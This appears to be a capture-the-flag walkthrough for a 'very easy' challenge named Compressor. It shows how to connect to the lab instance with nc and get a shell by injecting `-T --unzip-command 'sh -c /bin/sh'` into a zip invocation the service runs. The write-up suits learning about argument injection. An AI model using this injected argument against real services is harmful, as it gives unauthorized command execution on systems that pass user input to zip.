# Compressor Walk-through
>DESCRIPTION: Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

Looks like the docker instance is not a web-facing application:

![[No Web page.png]]

Let's use `nc` in a terminal:
```bash
nc <IP-ADRESS> <PORT>
```

![[Connecting to the instance.png]]

We have a few options to choose from but let's start out by making an artifact:
![[Creating Artifact.png]]

It doesn't matter what you name it or what is in it's content.
First take a look at the command below:
```bash
zip <name>.zip <name> -T --unzip-command 'sh -c /bin/sh'
```
Replace `<name>` with the name of the zip you set.

Now try to use the Compress artifact action (3) and after selecting the name of the zip, use the option shown below:
![[Leveraging zip command to launch shell.png]]

Once you have a shell, go up a few directories to find the flag:
![[Output of redacted flag.png]]

#veryeasy #misc #instance #shell #zip